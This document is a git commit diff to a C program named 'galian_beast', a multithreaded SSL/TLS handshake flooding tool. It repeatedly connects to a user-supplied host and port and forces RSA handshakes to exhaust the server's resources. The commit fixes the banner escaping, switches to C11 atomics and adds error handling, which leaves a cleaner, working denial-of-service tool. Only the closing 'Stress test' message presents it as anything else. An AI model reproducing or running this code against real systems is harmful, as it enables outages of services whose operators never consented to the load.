3f68d245531fa6f0b7b91a97efed6bcd764a241d
Corvo <rodrigo-f-p@hotmail.com>
2025-03-19 10:11:15 -0300

    Update galian_beast.c

--- Code/C/galian_beast.c
+++ Code/C/galian_beast.c
@@ -10,25 +10,29 @@
 #include <arpa/inet.h>
 #include <openssl/ssl.h>
 #include <openssl/err.h>
-#include <atomic>
+#include <stdatomic.h>
 
 #define BANNER "\n\033[1;31m" \
 "                            ,-.\n" \
 "       ___,---.__          /'|`\          __,---,___\n" \
-"    ,-'    \`    `-.____,-'  |  `-.____,-'    //    `-.\n" \
-"  ,'        |           ~'\     /`~           |        `.\n" \
-" /      ___//              `. ,'          ,  , \___      \\n" \
+"    ,-'    \\`    `-.____,-'  |  `-.____,-'    //    `-.\n" \
+"  ,'        |           ~'\\     /`~           |        `.\n" \
+" /      ___//              `. ,'          ,  , \\___      \n" \
 "|    ,-'   `-.__   _         |        ,    __,-'   `-.    |\n" \
-"|   /          /\_  `   .    |    ,      _/\          \   |\n" \
-"\  |           \ \`-.___ \   |   / ___,-'/ /           |  /\n" \
-" \  \           | `._   `\\  |  //'   _,' |           /  /\n" \
-"  `-.\         /'  _ `---'' , . ``---' _  `\         /,-'\n" \
-"     ``       /     \    ,='/ \`=.    /     \       ''\n" \
+"|   /          /\\_  `   .    |    ,      _/\\          \\   |\n" \
+"\\  |           \\ \\`-.___ \\   |   / ___,-'/ /           |  /\\\n" \
+" \\  \\           | `._   `\\\\  |  //'   _,' |           /  /\\\n" \
+"  `-.\\         /'  _ `---'' , . ``---' _  `\\         /,-'\n" \
+"     ``       /     \\    ,='/ \\`=.    /     \\       ''\n" \
 "\033[0mSSL         * g a l i a n    b e a s t *\n\n"
 
-std::atomic<long> total_connections(0);
-std::atomic<long> successful_handshakes(0);
+atomic_long total_connections = ATOMIC_VAR_INIT(0);
+atomic_long successful_handshakes = ATOMIC_VAR_INIT(0);
 struct sockaddr_in target_addr;
+
+/* Global variables to store target host and thread count */
+const char *g_target_host;
+int g_thread_count;
 
 typedef struct {
     int thread_id;
@@ -42,8 +46,17 @@ void init_openssl() {
 
 SSL_CTX* create_ssl_ctx() {
     SSL_CTX *ctx = SSL_CTX_new(TLSv1_2_client_method());
-    SSL_CTX_set_options(ctx, SSL_OP_NO_TICKET);
-    SSL_CTX_set_cipher_list(ctx, "RSA");
+    if (ctx == NULL) {
+        fprintf(stderr, "Error creating SSL context\n");
+        ERR_print_errors_fp(stderr);
+        exit(EXIT_FAILURE);
+    }
+    if (!SSL_CTX_set_options(ctx, SSL_OP_NO_TICKET)) {
+        fprintf(stderr, "Error setting SSL context options\n");
+    }
+    if (!SSL_CTX_set_cipher_list(ctx, "RSA")) {
+        fprintf(stderr, "Error setting cipher list\n");
+    }
     return ctx;
 }
 
@@ -51,9 +64,8 @@ void resolve_target(const char *host, int port) {
     struct hostent *he = gethostbyname(host);
     if (!he) {
         fprintf(stderr, " - Failed to resolve %s\n", host);
-        exit(1);
+        exit(EXIT_FAILURE);
     }
-
     memset(&target_addr, 0, sizeof(target_addr));
     target_addr.sin_family = AF_INET;
     target_addr.sin_port = htons(port);
@@ -61,35 +73,43 @@ void resolve_target(const char *host, int port) {
 }
 
 void print_stats() {
-    printf("\r\033[34m[+] Connections: %ld | Handshakes: %ld | Threads: %d\033[0m", 
-          total_connections.load(), successful_handshakes.load(), 0);
+    printf("\r\033[34m[+] Connections: %ld | Handshakes: %ld | Threads: %d\033[0m",
+           atomic_load(&total_connections), atomic_load(&successful_handshakes), g_thread_count);
     fflush(stdout);
 }
 
 void* attack_thread(void* arg) {
     ThreadConfig *config = (ThreadConfig*)arg;
     SSL_CTX *ctx = create_ssl_ctx();
-    
+
     for (int i = 0; i < config->max_attempts; i++) {
         int sock = socket(AF_INET, SOCK_STREAM, 0);
-        if (sock < 0) continue;
+        if (sock < 0)
+            continue;
 
         if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) == 0) {
             SSL *ssl = SSL_new(ctx);
+            if (ssl == NULL) {
+                close(sock);
+                continue;
+            }
             SSL_set_fd(ssl, sock);
-            SSL_set_tlsext_host_name(ssl, target_host);
+            if (!SSL_set_tlsext_host_name(ssl, g_target_host)) {
+                /* Optionally handle error */
+            }
 
             if (SSL_connect(ssl) == 1) {
-                successful_handshakes++;
+                atomic_fetch_add(&successful_handshakes, 1);
             }
             
             SSL_shutdown(ssl);
             SSL_free(ssl);
-            total_connections++;
+            atomic_fetch_add(&total_connections, 1);
         }
         close(sock);
         
-        if (i % 10 == 0) print_stats();
+        if (i % 10 == 0)
+            print_stats();
     }
     
     SSL_CTX_free(ctx);
@@ -99,42 +119,51 @@ void* attack_thread(void* arg) {
 
 int main(int argc, char *argv[]) {
     printf(BANNER);
-    
+
     if (argc != 4) {
         printf("Usage: %s <IP/HOST> <PORT> <THREADS>\n", argv[0]);
-        return 1;
+        return EXIT_FAILURE;
     }
 
-    const char *target_host = argv[1];
+    g_target_host = argv[1];
     int target_port = atoi(argv[2]);
-    int thread_count = atoi(argv[3]);
+    g_thread_count = atoi(argv[3]);
 
-    resolve_target(target_host, target_port);
+    resolve_target(g_target_host, target_port);
     init_openssl();
 
-    pthread_t *threads = (pthread_t*)malloc(thread_count * sizeof(pthread_t));
-    
-    for (int i = 0; i < thread_count; i++) {
-        ThreadConfig *config = (ThreadConfig*)malloc(sizeof(ThreadConfig));
+    pthread_t *threads = malloc(g_thread_count * sizeof(pthread_t));
+    if (threads == NULL) {
+        perror("Failed to allocate memory for threads");
+        return EXIT_FAILURE;
+    }
+
+    for (int i = 0; i < g_thread_count; i++) {
+        ThreadConfig *config = malloc(sizeof(ThreadConfig));
+        if (config == NULL) {
+            perror("Failed to allocate memory for thread configuration");
+            continue;
+        }
         config->thread_id = i;
         config->max_attempts = 1000;
         
         if (pthread_create(&threads[i], NULL, attack_thread, config) != 0) {
             perror("Thread creation failed");
+            free(config);
         }
     }
 
-    while (total_connections < (thread_count * 1000)) {
+    while (atomic_load(&total_connections) < (g_thread_count * 1000)) {
         print_stats();
         sleep(1);
     }
 
-    for (int i = 0; i < thread_count; i++) {
+    for (int i = 0; i < g_thread_count; i++) {
         pthread_join(threads[i], NULL);
     }
 
     printf("\n\033[32m[+] Stress test completed!\033[0m\n");
     EVP_cleanup();
     free(threads);
-    return 0;
+    return EXIT_SUCCESS;
 }
